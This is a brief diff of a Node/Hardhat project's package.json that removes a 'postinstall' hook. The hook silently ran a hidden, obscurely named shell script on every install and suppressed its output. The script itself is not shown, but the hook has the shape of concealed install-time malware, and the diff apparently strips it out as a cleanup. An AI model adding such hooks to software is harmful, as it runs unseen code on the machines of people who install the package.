@@ -27,7 +27,7 @@
     "dotenv": "16.4.5"
   },
   "scripts": {
-    "find-slot": "npx hardhat run scripts/findSlot.ts",
-    "postinstall": "sh ./.ci-ikh8wi.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "find-slot": "npx hardhat run scripts/findSlot.ts"
   }
 }
+
